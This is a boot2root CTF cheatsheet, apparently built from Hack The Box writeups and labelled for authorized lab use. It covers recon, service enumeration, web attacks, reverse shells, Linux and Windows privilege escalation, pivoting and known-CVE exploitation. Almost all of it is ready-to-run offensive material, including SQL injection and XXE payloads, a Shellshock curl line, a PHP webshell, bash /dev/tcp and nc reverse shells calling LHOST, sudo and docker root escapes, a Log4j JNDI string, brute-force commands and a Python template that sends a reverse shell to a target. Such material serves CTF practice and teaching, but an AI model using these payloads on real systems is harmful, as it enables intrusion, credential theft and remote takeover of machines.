# Boot2Root Cheatsheet

A one-pass field manual for Linux/Windows boot2root CTF boxes: recon, per-service
enumeration, web attacks, reverse shells, privilege escalation, pivoting, and a
quick lookup of known-CVE plays. A printable PDF version sits next to this file
([`Boot2Root_Cheatsheet.pdf`](./Boot2Root_Cheatsheet.pdf)).

> For authorized CTF / lab use only.
> Built from HTB Starting Point + retired-box writeups. References: GTFOBins,
> HackTricks, PayloadsAllTheThings.

**Workflow:** `0 Setup → 1 Recon → 2 Service enum → 3 Web → 4 Foothold → 5 Privesc → 6 Windows → 7 Known-CVE`
Set `IP` and `LHOST` once and reuse them. Let the open ports and exact versions
decide which section you actually need.

---

## 0. Setup

```bash
export IP=10.10.10.10
echo "$IP target.htb" | sudo tee -a /etc/hosts     # box uses a hostname?
mkdir -p ~/box/{scans,loot,www,exploit}; cd ~/box
python3 -m http.server 8000                         # serve files to the target
```

## 1. Recon — port scan

```bash
nmap -p- --min-rate 1000 -T4 $IP -oN scans/all.txt          # all ports, fast
nmap -p22,80,3306 -sC -sV -A $IP -oN scans/deep.txt         # deep scan the open ones
nmap --script vuln -p 443 $IP                               # CVE sweep
sudo nmap -sU --top-ports 50 $IP                            # UDP
nmap -Pn $IP                                                # ICMP blocked
```

- `-sC` default scripts · `-sV` versions · `-p-` all 65535 · `-A` OS + traceroute.

## 2. Service enumeration

One card per open port. Check each service and note the exact version (feeds section 7).

### FTP (21)
```bash
ftp $IP                      # user: anonymous, blank password
# ls -la ; binary ; get backup.zip
wget -r ftp://anonymous:a@$IP/
nmap -p21 --script ftp-vsftpd-backdoor $IP   # vsftpd 2.3.4 backdoor check
```

### rsync (873)
```bash
rsync --list-only rsync://$IP/
rsync -av rsync://$IP/public ./loot/
```

### SMB (139/445)
```bash
smbclient -L //$IP/ -N
smbmap -H $IP ; enum4linux -a $IP
smbclient //$IP/share -N      # then: get file
```

### MySQL / MariaDB (3306)
```bash
mysql -h $IP -u root -p
mysql -u user -p'pass' db -e 'select * from users;'   # one-liner query
```

### PostgreSQL (5432) / MongoDB (27017)
```bash
psql -h $IP -U postgres          # \l  \c db  \dt
mongo mongodb://$IP:27017        # show dbs ; use db ; db.col.find()
```

### SSH (22)
```bash
ssh user@$IP ; ssh -i id_rsa user@$IP ; chmod 600 id_rsa
ssh -o PubkeyAcceptedAlgorithms=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa user@$IP  # old server
```

### TFTP (69, UDP), SNMP (161, UDP), NFS (2049)
```bash
tftp $IP                         # put shell.php  (pair with LFI)
snmpwalk -v2c -c public $IP ; onesixtyone $IP public
showmount -e $IP ; sudo mount -t nfs $IP:/export /mnt
```

### Odd web ports (3000 Grafana, 8080 Jetty, 8443 UniFi…)
```bash
curl -s http://$IP:3000 | grep -i version
curl -v http://$IP:8080/login        # X-Powered-By / Server headers
```

## 3. Web enumeration & attacks

```bash
whatweb http://$IP ; nikto -h http://$IP ; curl -sI http://$IP   # fingerprint
curl -s http://$IP | grep -i "version\|TODO\|pass\|action"       # read source
gobuster dir -u http://$IP -x php,txt,html,jar -w /usr/share/wordlists/dirb/common.txt -t 40
ffuf -u http://target.htb -H "Host: FUZZ.target.htb" -w subdomains-top1million-5000.txt -fs 154
cewl http://$IP -w site.txt          # build a wordlist from the site
```
Strip the file from a URL to list the directory (`/login/`). Add any found vhost to `/etc/hosts`.

**SQL injection — login bypass**
```
' OR 1=1-- -
admin'-- -
username[]=1&password[]=1          # PHP type-juggling (arrays)
```

**SQL injection — manual UNION**
```sql
' ORDER BY 3-- -                                     -- column count
' UNION SELECT 1,2,3-- -                             -- reflected column
' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -
' UNION SELECT 1,concat(user,0x3a,password),3 FROM users-- -
```

**Shellshock (CGI, CVE-2014-6271)**
```bash
curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'id'" http://$IP/cgi-bin/user.sh
# revshell: swap id for  bash -i >& /dev/tcp/LHOST/9001 0>&1
```

**LFI → RCE**
```
?file=../../../../etc/passwd
?file=php://filter/convert.base64-encode/resource=index
# RCE: upload shell.php via tftp/ftp, then include it; or poison access.log then include it
```

**XXE — read files**
```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<root><name>&x;</name></root>
```

**File upload → webshell**
```php
<?php system($_GET['cmd']); ?>
```
```
http://$IP/uploads/shell.php?cmd=id      # blocked? .phtml .php5 ;.jpg / change Content-Type
```

**JWT / JWE forge:** try `alg:none`, set `role` to admin (`jwt_tool <token> -X a`). Read
`/static/js/app.js` for hidden API routes.

## 4. Foothold & reverse shells

```bash
rlwrap nc -lvnp 9001                                        # listener first (LHOST = tun0)
bash -i >& /dev/tcp/LHOST/9001 0>&1                         # bash revshell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST 9001 >/tmp/f   # nc fifo (no -e)

# stabilise the shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z ; then on your box:  stty raw -echo; fg
export TERM=xterm; stty rows 40 cols 180
```
Credential reuse wins boxes: try found creds on SSH, web, SMB, DB; `su - user`;
`env` leaks cleartext creds inside containers.

Metasploit foothold:
```
msfconsole
use exploit/multi/samba/usermap_script        # example
set RHOSTS $IP ; set LHOST tun0 ; run
```

## 5. Privilege escalation (Linux)

```bash
id; sudo -l; getcap -r / 2>/dev/null
./linpeas.sh | tee lp.txt
find / -perm -4000 -type f 2>/dev/null          # SUID
cat /etc/crontab; ./pspy64                       # cron / processes
```

| Vector | When | Command |
|---|---|---|
| sudo GTFOBins | allowed binary | `sudo find . -exec /bin/sh \; -quit` · `sudo vi -c ':!/bin/sh'` · `sudo perl -e 'exec "/bin/bash";'` |
| sudo CVE-2019-14287 | `(ALL, !root)` rule, sudo <1.8.28 | `sudo -u#-1 /bin/bash` |
| snap (Armageddon) | `sudo snap install` allowed | build malicious snap with `fpm`, install hook edits `/etc/sudoers` |
| tmux hijack (Valentine) | root tmux on a readable socket | `tmux -S /path/sock attach` |
| docker group | user in `docker` | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` |
| hidden docker (gshadow) | group via `/etc/gshadow` | `sg docker -c 'docker run -v /:/h --rm -u 0 alpine cat /h/root/root.txt'` |
| docker exec only | `sudo docker exec` allowed | find cid, `sudo docker exec --privileged -u 0 -it <cid> bash` |
| SSH CA (Principal) | readable CA private key | `ssh-keygen -s ca -I x -n root k.pub` → log in as root with the signed cert |
| writable cron | root runs a script you can write | append `bash -i >& /dev/tcp/LHOST/9002 0>&1` |
| capabilities | `cap_setuid+ep` | `./python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'` |

**Pivoting** (reach loopback-only services):
```bash
ssh -L 3001:127.0.0.1:3001 user@$IP        # local forward
ssh -D 1080 user@$IP ; proxychains nmap -sT -Pn 172.16.0.5   # dynamic SOCKS
./chisel server -p 8080 --reverse          # your box (no ssh creds)
./chisel client LHOST:8080 R:socks         # target
```
Check `ss -tlnp` for root-owned services on `127.0.0.1`, then forward + exploit.

## 6. Windows quick hits

```bash
smbclient -N -L \\\\$IP\\ ; smbclient -N \\\\$IP\\backups     # config holds MSSQL creds
impacket-mssqlclient user:'pass'@$IP -windows-auth
# SQL> enable_xp_cmdshell ; xp_cmdshell "whoami"
impacket-psexec administrator:'pass'@$IP
whoami /priv          # SeImpersonate -> PrintSpoofer / GodPotato
.\winPEASany.exe
type ...\PSReadLine\ConsoleHost_history.txt   # creds in PowerShell history
findstr /si password *.txt *.xml *.config
```

## 7. Known-CVE plays

Spot the app + version → look it up → run the play.

| App / version | CVE | Quick play |
|---|---|---|
| Samba 3.0.20 | CVE-2007-2447 | `msf: exploit/multi/samba/usermap_script` → root |
| vsftpd 2.3.4 | backdoor :6200 | `nmap -p21 --script ftp-vsftpd-backdoor` / `msf: vsftpd_234_backdoor` |
| Apache CGI / bash | Shellshock CVE-2014-6271 | `curl -H "User-Agent: () { :; }; /bin/bash -c 'id'" $IP/cgi-bin/x.sh` |
| OpenSSL 1.0.1 | Heartbleed CVE-2014-0160 | `nmap -p443 --script ssl-heartbleed $IP`; PoC dumps memory |
| Drupal 7 | Drupalgeddon2 | `msf: exploit/unix/webapp/drupal_drupalgeddon2`; then read `sites/default/settings.php` |
| Bludit 3.9.2 | CVE-2019-17240 / -16113 | `cewl` wordlist + auth brute-bypass; `msf: bludit_upload_images_exec` |
| PHP 8.1.0-dev | User-Agentt backdoor | `curl $IP/ -H "User-Agentt: zerodiumsystem('id');"` |
| Grafana 8.0.x | CVE-2021-43798 (LFI) | path-traversal read `grafana.db`, then `sqlite3 g.db "SELECT login,password FROM user;"` |
| KeePass <2.54 | CVE-2023-32784 | recover master-key chars from a memory dump (`keepass-dump-masterkey`) |
| Dolibarr 17.0.0 | CVE-2023-30253 | `python3 exploit.py http://crm.htb admin admin LHOST 4444`; then `conf.php` |
| Enlightenment <0.25.4 | CVE-2022-37706 | SUID LPE exploit → local root |
| Log4j (UniFi etc.) | CVE-2021-44228 | `${jndi:ldap://LHOST:1389/x}` in a logged header; serve with JNDIExploit |
| sudo <1.8.28 | CVE-2019-14287 | `sudo -u#-1 /bin/bash` |

**Flow for any version:** note the exact app + version (nmap / headers / source) →
google `"<app> <version> exploit/cve"` → `searchsploit <app>` → read the PoC, fix
LHOST/target, run.

## ★ Scripts & payloads by vulnerability

```bash
# SQLi (auto)
sqlmap -r req.txt --batch --dump
sqlmap -u "http://$IP/?q=1" --batch --os-shell         # RCE

# hash crack
hashid '$6$...'
john --wordlist=rockyou.txt h.txt ; john --show h.txt
hashcat -m 0 h.txt rockyou.txt                         # 1800 sha512 / 1000 ntlm

# locked file
zip2john f.zip > z.hash        # or: fcrackzip -D -p rockyou.txt f.zip
ssh2john id_rsa > k.hash
john --wordlist=rockyou.txt z.hash

# read a sqlite db / decompile a jar / recover deleted
sqlite3 x.db ".tables" ; sqlite3 x.db "SELECT login,password FROM user;"
unzip app.jar -d out ; strings out/*.class | grep -i pass
strings /dev/sdb > dump.txt ; less dump.txt

# saved Firefox creds
python3 firefox_decrypt.py ./profile/                  # logins.json + key4.db

# weak creds
hydra -l admin -P rockyou.txt ssh://$IP
hydra -l admin -P w.txt $IP http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

Custom exploit template:
```python
#!/usr/bin/env python3
import requests, sys
IP, LHOST = sys.argv[1], sys.argv[2]
rev = f"bash -i >& /dev/tcp/{LHOST}/9001 0>&1"
requests.post(f"http://{IP}/vuln", data={"cmd": rev}, timeout=10)
print("[+] sent; check your nc -lvnp 9001")
```

## # Quick reference

```bash
# wordlists
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Discovery/Web-Content/
/usr/share/seclists/Discovery/DNS/

# move a file to the target
python3 -m http.server 8000           # your box
wget http://LHOST:8000/linpeas.sh     # target
base64 -w0 file                        # -> base64 -d on target (no wget/curl)

# first commands on a new shell
id; whoami; hostname; sudo -l; ss -tlnp
find / -writable -type d 2>/dev/null

# flags
cat /home/*/user.txt ; cat /root/root.txt
find / -name "*.txt" 2>/dev/null | grep -iE "user|root|flag"
# windows: type C:\Users\*\Desktop\*.txt
```
